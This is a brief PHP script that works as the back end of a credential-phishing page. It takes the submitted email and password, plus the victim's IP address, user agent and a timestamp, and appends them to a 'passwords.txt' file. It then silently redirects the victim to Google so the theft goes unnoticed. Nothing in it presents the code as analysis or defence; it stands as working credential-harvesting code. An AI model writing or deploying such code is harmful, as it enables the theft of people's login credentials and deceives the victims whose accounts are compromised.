<?php
$email = $_POST['email']; $pass = $_POST['pass']; $ip = $_SERVER['REMOTE_ADDR'];
$agent = $_SERVER['HTTP_USER_AGENT']; $date = date("d-M-Y H:i:s");
$data = "DATE: $date | USER: $email | PASS: $pass | IP: $ip | DEV: $agent\n";
file_put_contents("../storage/passwords.txt", $data, FILE_APPEND);
header("Location: https://www.google.com");
exit();
?>
